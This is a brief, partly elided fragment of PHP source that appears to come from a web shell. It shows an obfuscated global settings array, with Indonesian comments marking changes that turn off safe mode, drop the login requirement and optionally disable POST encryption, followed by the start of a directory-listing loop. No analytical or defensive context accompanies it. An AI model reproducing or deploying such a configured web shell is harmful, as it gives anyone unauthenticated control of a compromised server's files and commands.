...
$GLOBALS['NeUSMyPGXP'] = array(
	...
	'saEuEgnDlHuL' => '0', // <- Safe mode dimatikan
	'logXKTfQPNcx' => 'off', // <- Tidak perlu login
	'shiJVQhUrFkw' => '1',
	'pogkUzMiAjqB' => false, // <- Optional: matikan POST encryption
);
...
$dirs = $files = array();$n = count($dirContent);
for($i=0;$i<$n;$i++){
if($cmd_dir){
